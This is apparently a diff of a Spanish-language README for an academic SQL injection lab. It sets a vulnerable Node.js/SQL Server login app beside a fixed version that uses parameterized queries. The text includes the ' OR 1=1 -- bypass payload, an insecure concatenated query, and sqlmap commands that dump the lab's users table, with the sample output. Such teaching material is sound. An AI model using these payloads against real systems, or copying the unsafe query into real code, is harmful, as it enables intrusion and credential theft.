@@ -1,57 +1,52 @@
 # KMATA – SQL Injection Lab
 
-## Descripción
+## 1. Descripción General
 
 Este laboratorio académico demuestra:
 
 1. Desarrollo de una aplicación web vulnerable a SQL Injection.
-2. Explotación de la vulnerabilidad utilizando sqlmap.
-3. Desarrollo de una versión 2.0 segura mediante consultas parametrizadas.
-4. Contenerización de ambas versiones utilizando Docker y Docker Compose.
+2. Desarrollo de una versión 2.0 segura mediante consultas parametrizadas.
+3. Contenerización utilizando Docker Compose.
+4. Explotación de la versión vulnerable con sqlmap.
 5. Validación técnica de la mitigación implementada.
 
----
+Ambas aplicaciones utilizan:
 
-## Estructura del Proyecto
-
-
-KMATA-SQL-INJECTION-LAB/
-│
-├── database/
-│ └── init.sql
-│
-├── v1-vulnerable/
-│ ├── app/
-│ └── Dockerfile
-│
-├── v2-secure/
-│ ├── app/
-│ └── Dockerfile
-│
-└── docker-compose.yml
-
+* Node.js / Express
+* Microsoft SQL Server
+* Docker y Docker Compose
 
 ---
 
-## Requisitos
+# PARTE I — Aplicación Vulnerable
 
-- Docker Desktop instalado
-- Python instalado
-- sqlmap descargado
-- Puertos 3000, 4000 y 1433 disponibles
+## 2. Arquitectura
+
+Usuario → Aplicación Web → SQL Server
+
+La versión vulnerable construye consultas SQL concatenando directamente los parámetros enviados por el usuario.
+
+Ejemplo conceptual inseguro:
+
+
+const query = "SELECT * FROM users WHERE username = '" + username +
+"' AND password = '" + password + "'";
+
+
+Esta práctica permite la inyección de código SQL.
 
 ---
 
-## Configuración de la Base de Datos
+## 3. Inicialización de la Base de Datos
 
-El archivo `init.sql` ubicado en la carpeta `database/` contiene:
+El archivo `init.sql` contiene:
 
-- Creación de base de datos `kmata_lab_db`
-- Creación de login `kmata`
-- Creación de usuario en base
-- Asignación de permisos
-- Creación de tabla `users`
-- Inserción de datos de prueba
+* Creación de la base de datos `kmata_lab_db`
+* Creación de login `kmata`
+* Creación de usuario
+* Asignación de permisos
+* Creación de la tabla `users`
+* Inserción de datos de prueba
 
 Usuarios disponibles:
 
@@ -61,98 +56,38 @@ Usuarios disponibles:
 | user1    | 1234      |
 | paola    | password  |
 
+Para reinicializar completamente la base:
+
+
+docker compose down -v
+
+
+El parámetro `-v` elimina los volúmenes y fuerza la recreación de la base de datos.
+
 ---
 
-## Cómo ejecutar el laboratorio
+## 4. Cómo levantar el laboratorio
 
-Desde la raíz del proyecto ejecutar:
+Desde la raíz del proyecto:
 
 
 docker compose up --build
 
 
-Esto levantará:
+Esto realiza:
 
-- SQL Server
-- Aplicación vulnerable en http://localhost:3000
-- Aplicación segura en http://localhost:4000
+1. Levantamiento de SQL Server.
+2. Ejecución automática del script `init.sql`.
+3. Inicio de la aplicación vulnerable.
+4. Inicio de la aplicación segura.
 
-Para detener los contenedores:
-
-
-docker compose down
-
-
----
-
-# Pruebas – Versión Vulnerable
-
-Acceder a:
+La aplicación vulnerable queda disponible en:
 
 
 http://localhost:3000
 
 
-## Login válido
-
-Usuario: admin  
-Password: admin123  
-
-Resultado esperado: Login exitoso
-
----
-
-## Prueba manual de SQL Injection
-
-En el campo usuario ingresar:
-
-
-' OR 1=1 --
-
-
-Resultado esperado:
-
-Permite acceso sin credenciales válidas.
-
-Esto confirma que la aplicación es vulnerable debido a concatenación directa de parámetros en la consulta SQL.
-
----
-
-## Ataque con sqlmap – Versión Vulnerable
-
-Ejecutar:
-
-
-python C:\sqlmap-dev\sqlmap.py -u "http://localhost:3000/auth/login
-" --data="username=admin&password=123" --method=POST -p username --level=5 --risk=3 --batch --dump --flush-session
-
-
-Resultado esperado:
-
-- Detecta parámetro inyectable
-- Identifica Microsoft SQL Server
-- Enumera la base de datos kmata_lab_db
-- Extrae la tabla users
-
-Ejemplo de resultado:
-
-
-Database: kmata_lab_db
-Table: users
-+----+----------+----------+
-| id | password | username |
-+----+----------+----------+
-| 1 | admin123 | admin |
-| 2 | 1234 | user1 |
-| 3 | password | paola |
-+----+----------+----------+
-
-
----
-
-# Pruebas – Versión Segura (2.0)
-
-Acceder a:
+La aplicación segura queda disponible en:
 
 
 http://localhost:4000
@@ -160,88 +95,161 @@ http://localhost:4000
 
 ---
 
-## Seguridad Implementada
+## 5. Pruebas Manuales — Versión Vulnerable
 
-La versión 2.0 elimina la vulnerabilidad mediante:
+### Login válido
 
-- Validación de entrada
-- Uso de consultas parametrizadas
-- Tipado explícito de parámetros
 
-Ejemplo:
+http://localhost:3000/auth/login
 
-```javascript
-request.input('username', sql.VarChar(50), username);
-request.input('password', sql.VarChar(50), password);
 
-SELECT * FROM users WHERE username = @username AND password = @password
-Prueba manual de inyección
+Credenciales:
 
-Intentar ingresar:
+
+username=admin
+password=admin123
+
+
+Resultado esperado: acceso exitoso.
+
+### SQL Injection manual
+
+Ingresar como username:
+
 
 ' OR 1=1 --
 
+
+Password: cualquier valor.
+
+Resultado esperado: bypass del login.
+
+---
+
+## 6. Explotación con sqlmap — Versión Vulnerable
+
+Ejemplo:
+
+
+python sqlmap.py -u "http://localhost:3000/auth/login
+"
+--data="username=admin&password=123"
+--method=POST -p username --dump --batch
+
+
+Posibles comandos adicionales:
+
+Obtener bases de datos:
+
+
+sqlmap -u "URL_OBJETIVO" --dbs
+
+
+Obtener tablas:
+
+
+sqlmap -u "URL_OBJETIVO" -D kmata_lab_db --tables
+
+
+Dump completo:
+
+
+sqlmap -u "URL_OBJETIVO" --dump
+
+
+Resultado esperado: extracción completa de la tabla `users`.
+
+---
+
+# PARTE II — Versión 2.0 Aplicación Segura
+
+## 7. Mejoras Implementadas
+
+La versión segura corrige la vulnerabilidad mediante:
+
+1. Uso de consultas parametrizadas.
+2. Separación entre datos y código SQL.
+3. Tipado explícito de parámetros.
+4. Validación de entrada.
+
+Ejemplo conceptual seguro:
+
+
+request.input('username', sql.VarChar(50), username)
+request.input('password', sql.VarChar(50), password)
+
+SELECT * FROM users WHERE username = @username AND password = @password
+
+
+---
+
+## 8. Pruebas — Versión Segura
+
+### Login válido
+
+
+http://localhost:4000/auth/login
+
+
+Credenciales:
+
+
+username=admin
+password=admin123
+
+
+Resultado esperado: acceso exitoso.
+
+### Intento de SQL Injection
+
+
+username=' OR 1=1 --
+password=anything
+
+
 Resultado esperado:
 
-Credenciales incorrectas
+* El login falla.
+* No se produce bypass.
+* sqlmap no detecta parámetros inyectables.
 
-No se produce bypass.
+---
 
-Ataque con sqlmap – Versión Segura
+## 9. Prueba con sqlmap — Versión Segura
 
-Ejecutar:
 
-python C:\sqlmap-dev\sqlmap.py -u "http://localhost:4000/auth/login" --data="username=admin&password=123" --method=POST -p username --level=5 --risk=3 --batch --dump --flush-session
+python sqlmap.py -u "http://localhost:4000/auth/login
+"
+--data="username=admin&password=123"
+--method=POST -p username --dump --batch
+
 
 Resultado esperado:
+
 
 [CRITICAL] all tested parameters do not appear to be injectable
 
-No permite:
 
-Detectar DBMS
+---
 
-Enumerar base de datos
+# 10. Comparación Técnica
 
-Extraer información
+| Característica        | Vulnerable            | Versión 2.0   |
+|----------------------|-----------------------|---------------|
+| Construcción SQL     | Concatenación directa | Parametrizada |
+| Validación de entrada| No                    | Sí            |
+| Vulnerable a SQLi    | Sí                    | No            |
+| Explotable con sqlmap| Sí                    | No            |
 
-Comparación Técnica
-Versión Vulnerable
+---
 
-Construcción dinámica de consulta SQL
+# 11. Conclusiones
 
-Concatenación directa de parámetros
+Este laboratorio demuestra:
 
-Vulnerable a:
+* Cómo una mala práctica en la construcción de consultas SQL compromete completamente una base de datos.
+* Cómo herramientas automatizadas pueden explotar vulnerabilidades reales con facilidad.
+* Cómo la parametrización elimina una vulnerabilidad crítica.
+* Cómo Docker permite reproducibilidad del entorno.
 
-Boolean-based injection
-
-Time-based injection
-
-Stacked queries
-
-Permite extracción completa de datos
-
-Versión Segura
-
-Uso de consultas parametrizadas
-
-Separación entre datos y código SQL
-
-sqlmap no detecta parámetros inyectables
-
-No permite enumeración ni extracción
-
-Conclusión
-
-El laboratorio demuestra de forma práctica:
-
-Cómo se explota una vulnerabilidad SQL Injection.
-
-Cómo una mala práctica (concatenación de strings) compromete la base de datos.
-
-Cómo la parametrización elimina completamente la vulnerabilidad.
-
-Cómo Docker permite reproducibilidad del entorno.
-
-Se valida que la versión 2.0 mitiga exitosamente la vulnerabilidad identificada en la versión 1.
+La comparación entre ambas versiones evidencia el impacto directo de aplicar buenas prácticas de desarrollo seguro.
